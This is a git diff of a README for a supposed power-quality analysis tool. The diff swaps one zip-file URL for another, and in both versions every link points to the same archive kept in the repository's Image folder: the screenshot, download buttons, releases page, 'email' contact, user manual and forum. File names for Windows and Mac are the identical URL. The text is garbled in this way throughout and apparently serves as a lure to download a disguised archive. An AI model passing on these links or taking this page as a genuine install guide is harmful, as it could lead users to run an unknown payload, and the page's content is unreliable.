@@ -4,11 +4,11 @@
 
 The **power-inspection** tool helps you analyze power quality effectively. It provides insights into electrical parameters that are crucial for ensuring the safety and efficiency of your electrical systems. 
 
-![Power Inspection](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
+![Power Inspection](https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip)
 
 ## 📥 Download Now
 
-[![Download Power Inspection](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip%https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
+[![Download Power Inspection](https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip%https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip)](https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip)
 
 ## 🔍 Features
 
@@ -29,11 +29,11 @@ The **power-inspection** tool helps you analyze power quality effectively. It pr
 
 ### Step 1: Visit the Releases Page
 
-To begin, [visit this page to download](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip). Here, you will find the latest version of **power-inspection**.
+To begin, [visit this page to download](https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip). Here, you will find the latest version of **power-inspection**.
 
 ### Step 2: Download the Application
 
-Look for the most recent release. Click on the download link for your operating system. The file will typically be named something like `https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip` for Windows or `https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip` for Mac.
+Look for the most recent release. Click on the download link for your operating system. The file will typically be named something like `https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip` for Windows or `https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip` for Mac.
 
 ### Step 3: Install the Application
 
@@ -68,16 +68,16 @@ If you encounter any issues:
 
 ## 🤝 Support
 
-For further assistance, you can check the **Issues** section of the repository or reach out via email at https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip We are here to help!
+For further assistance, you can check the **Issues** section of the repository or reach out via email at https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip We are here to help!
 
 ## 🔗 Additional Resources
 
-- [Power Quality Basics](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
-- [User Manual](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
-- [Community Forum](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip)
+- [Power Quality Basics](https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip)
+- [User Manual](https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip)
 
 ## 🛠️ Contributing
 
 If you want to contribute, please follow our guidelines on the GitHub repository. We welcome improvements and suggestions!
 
-[Download Now](https://github.com/Thomasetiawan/power-inspection/raw/refs/heads/main/Image/power-inspection-v1.7.zip) to start your power quality analysis journey!
+[Download Now](https://raw.githubusercontent.com/Thomasetiawan/power-inspection/main/Image/inspection-power-1.4-alpha.2.zip) to start your power quality analysis journey!
